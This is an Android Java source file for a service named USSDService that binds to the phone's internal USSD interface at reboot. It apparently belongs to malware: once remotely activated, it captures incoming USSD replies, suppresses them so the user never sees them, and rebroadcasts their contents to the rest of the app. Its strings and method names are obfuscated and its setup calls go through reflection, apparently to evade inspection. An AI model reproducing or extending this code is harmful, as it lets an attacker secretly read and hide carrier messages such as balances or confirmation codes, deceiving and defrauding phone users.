package com.moonny.srvs;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.IBinder;
import android.os.PatternMatcher;
import android.os.RemoteException;
import android.util.Log;

import com.android.internal.telephony.IExtendedNetworkService;
import com.moonny.R;
import com.moonny.constants.Constant;
import com.moonny.constants.S;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

/**
 * Service implements IExtendedNetworkService interface.
 * USSDDumbExtendedNetworkService
 * Service must have name "com.android.ussd.IExtendedNetworkService" of the intent declared
 * in the Android manifest file so com.android.phone.PhoneUtils class bind
 * to this service after system rebooted.
 * Please note service is loaded after system reboot!
 * Your application must check is system rebooted.
 * @ see Util#syslogHasLine(String, String, String, boolean)
 */
public class USSDService extends Service {
    public static final String TAG = S.USSDService;
    //public static final String LOG_STAMP = "*USSDTestService bind successfully*";
    public static final String URI_SCH = S.ussd_uri;
    public static final String URI_AUT = S.uri_aut;
    public static final String URI_PATH = S.uri_path;
    public static final String URI_PAR = S.uri_par;
    public static final String MAG_ON = S.mag_on;
    public static final String MAG_OFF = S.mag_off;
    public static final String MAG_RETVAL = S.mag_retval;

    private static boolean mAct = false;
    private static CharSequence mRetVal = null;
    private Context mContext = null;
    private String msgUSSDRunning = S.ussd_msg;

    final BroadcastReceiver mReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (S.action_insert.equals(intent.getAction())) {
                mContext = context;
                if (mContext != null) {
                    msgUSSDRunning = S.s(mContext.getString(R.string.a));
                    mAct = true;
//                    Log.d(TAG, "a c t i v a t e");
                }
            } else if (S.action_delete.equals(intent.getAction())) {
                mContext = null;
                mAct = false;
//                Log.d(TAG, "d e a c t i v a t e");
            }
        }
    };

    private final IExtendedNetworkService.Stub mBinder = new IExtendedNetworkService.Stub() {
        @Override
        public void setMmiString(String number) throws RemoteException {
//            Log.d(TAG, "s e t  M m i  S t r i n g: " + number);
        }

        @Override
        public CharSequence getMmiRunningText() throws RemoteException {
//            Log.d(TAG, "g e t  M m i  R u n n i n g T e x t: " + msgUSSDRunning);
            return msgUSSDRunning;
        }

        @Override
        public CharSequence getUserMessage(CharSequence text)
                throws RemoteException {
            if (MAG_ON.contentEquals(text)) {
                mAct = true;
//                Log.d(TAG, "c o n t r o l: O N");
                return text;
            } else {
                if (MAG_OFF.contentEquals(text)) {
                    mAct = false;
//                    Log.d(TAG, "c o n t r o l: O F F");
                    return text;
                } else {
                    if (MAG_RETVAL.contentEquals(text)) {
                        mAct = false;
//                        Log.d(TAG, "c o n t r o l: r e t u r n");
                        return mRetVal;
                    }
                }
            }

            if (!mAct) {
//                Log.d(TAG, "g e t  U s e r  M e s s a g e  d e a c t i v a t e d: " + text);
                return text;
            }
//            String s = text.toString();
            // store s to the !
            Uri uri = new Uri.Builder()
                    .scheme(URI_SCH)
                    //.authority(URI_AUT)
                    .path(URI_PATH)
                    .appendQueryParameter(URI_PAR, text.toString())
                    .build();
            sendBroadcast(getIntent(uri));
            mAct = false;
            mRetVal = text;
//            Log.d(TAG, "g e t  U s e r  M e s s a g e: " + text + "=" + s);
            return null;
        }

        private Intent getIntent(Uri uri) {
            return new Intent(Intent.ACTION_GET_CONTENT, uri);
        }

        @Override
        public void clearMmiString() throws RemoteException {
//            Log.d(TAG, "c l e a r  S t r i n g");
//            Log.d(TAG, "c l e a r  M m i  S t r i n g");
        }
    };

    private IntentFilter setupFilter(IntentFilter filter) {

        Method act1 = null;
        Method act2 = null;
        Method act3 = null;
        Method act4 = null;
        try {
            act1 = IntentFilter.class.getDeclaredMethod(S.addAction, Intent.class);
            act2 = IntentFilter.class.getDeclaredMethod(S.addDataScheme, String.class);
            act3 = IntentFilter.class.getDeclaredMethod(S.addDataAuthority, String.class, String.class);
            act4 = IntentFilter.class.getDeclaredMethod(S.addDataPath, String.class, int.class);
        } catch (Exception e) {
            e.printStackTrace();
        }

        try {
//            act1.invoke(filter, Intent.ACTION_INSERT);
            act1.invoke(filter, S.action_insert);
            act1.invoke(filter, S.action_delete);

            act2.invoke(filter, URI_SCH);
            act3.invoke(filter, URI_AUT, null);
            act4.invoke(filter, URI_PATH, PatternMatcher.PATTERN_LITERAL);

        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        }

        return filter;
    }

    @Override
    public IBinder onBind(Intent intent) {
        // Do not localize!
        //Log.i(TAG, LOG_STAMP);
		try {
	        IntentFilter filter = new IntentFilter();
    	    registerReceiver(mReceiver, setupFilter(filter));
		} catch(Exception e){
            if(Constant.DEBUG) Log.e(TAG, "ERROR: " + e.getMessage());
            e.printStackTrace();
		}
        return mBinder;
    }

    public IBinder asBinder() {
       // Log.d(TAG, "asBinder");
        return mBinder;
    }

}
